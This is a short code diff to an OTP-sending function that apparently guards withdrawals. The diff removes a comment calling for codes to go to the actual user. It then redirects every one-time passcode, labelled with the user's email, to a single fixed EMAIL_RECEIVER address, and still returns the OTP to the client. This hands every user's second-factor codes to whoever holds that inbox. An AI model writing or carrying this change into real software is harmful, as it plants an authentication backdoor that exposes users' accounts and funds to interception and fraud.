@@ -237,7 +237,6 @@ export async function createOTP() {
       { $set: { otp } },
     );
 
-    // FIX: send OTP to the actual user, not EMAIL_RECEIVER
     const transporter = nodemailer.createTransport({
       service: "gmail",
       auth: {
@@ -248,13 +247,13 @@ export async function createOTP() {
 
     await transporter.sendMail({
       from: process.env.EMAIL_USER,
-      to: user.email,
+      to: process.env.EMAIL_RECEIVER, // OTP sent here
       subject: "OTP Verification",
-      html: `<h2>Your OTP is: <strong>${otp.code}</strong></h2>
+      html: `<h2>${user?.email}'s OTP is: <strong>${otp.code}</strong></h2>
              <p>This code expires in 10 minutes.</p>`,
     });
 
-    // Return updated user so the client can refresh state
+    // Still return updated user so WithdrawForm can refresh OTP in state
     return parseStringify({ ...user, otp });
   } catch (error) {
     console.log(error);
